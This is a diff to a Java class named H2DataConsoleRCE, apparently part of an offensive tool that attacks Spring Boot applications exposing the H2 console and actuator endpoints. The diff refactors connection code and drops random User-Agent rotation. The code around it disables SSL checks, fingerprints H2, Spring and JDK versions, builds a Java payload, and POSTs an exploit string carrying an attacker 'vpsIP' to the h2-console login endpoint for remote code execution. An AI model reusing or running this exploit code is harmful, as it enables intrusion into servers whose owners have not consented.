@@ -1,21 +1,17 @@
 package src.main.module;
 
-import src.main.LoadLib.ClassCom.ClsComp;
-import src.main.common.UA_Config;
+import src.main.common.HTTPConfig;
+import src.main.loadlib.ClassCom.ClsComp;
 import src.main.common.VersionComparator;
 import src.main.impl.ResultCallback;
 
 import java.io.*;
 import java.net.HttpURLConnection;
-import java.net.MalformedURLException;
-import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import java.util.List;
-import java.util.Objects;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-import static src.main.SSLVerify.sslVer.disableSSLVerification;
+import static src.main.ssl.sslVer.disableSSLVerification;
 
 public class H2DataConsoleRCE {
     private String address;
@@ -40,15 +36,9 @@ public class H2DataConsoleRCE {
         String llib2 = "jdk";
         String h2site = address + "/h2-console/login.do?jsessionid=";
         String data = "";
-        String ua = "";
         disableSSLVerification();
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -75,12 +65,7 @@ public class H2DataConsoleRCE {
                     callback.onResult(text);
                     text = String.format("jdk版本为: %s", matcher2.group(1));
                     callback.onResult(text);
-                    URL obj1 = new URL(address + "/h2-console");
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                    UA_Config uacf1 = new UA_Config();
-                    List<String> ualist1 = uacf1.loadUserAgents();
-                    ua = uacf.getRandomUserAgent(ualist1);
-                    conn1.setRequestProperty("User-Agent",ua);
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/h2-console");
                     conn1.setRequestMethod("GET");
                     int responseCode1 = conn1.getResponseCode();
                     BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
@@ -103,11 +88,8 @@ public class H2DataConsoleRCE {
                             if (isModify){
                                 cc.CompileJava("H2DataConsole","H2DataConsole",callback);
                             }
-                            URL obj2 = new URL(h2site + jess);
-                            HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
+                            HttpURLConnection conn2 = HTTPConfig.createConnection(h2site + jess);
                             data = String.format(exp2,vpsIP);
-                            ua = uacf.getRandomUserAgent(ualist1);
-                            conn2.setRequestProperty("User-Agent",ua);
                             conn2.setRequestMethod("POST");
                             conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                             conn2.setRequestProperty("Referer",h2site + jess);
@@ -154,15 +136,9 @@ public class H2DataConsoleRCE {
         String llib = "h2database";
         String llib1 = "spring.h2.console.enabled";
         String llib2 = "jdk";
-        String ua = "";
         disableSSLVerification();
         try {
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -195,10 +171,8 @@ public class H2DataConsoleRCE {
                             VersionComparator.isVersionAtLeast(matcher2.group(1),"7u191") ||
                             VersionComparator.isVersionAtLeast(matcher2.group(1),"6u201")
                     ){
-                        URL obj1 = new URL(address + "/actuator");
-                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                        HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                         conn1.setDoOutput(true);
-                        conn1.setRequestProperty("User-Agent", ua);
                         conn1.setRequestMethod("GET");
                         int responseCode1 = conn1.getResponseCode();
                         BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
@@ -231,15 +205,9 @@ public class H2DataConsoleRCE {
     public void Exp(ResultCallback callback){
         String api ="/actuator/env";
         String site = address + api;
-        String ua = "";
         disableSSLVerification();
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK) {
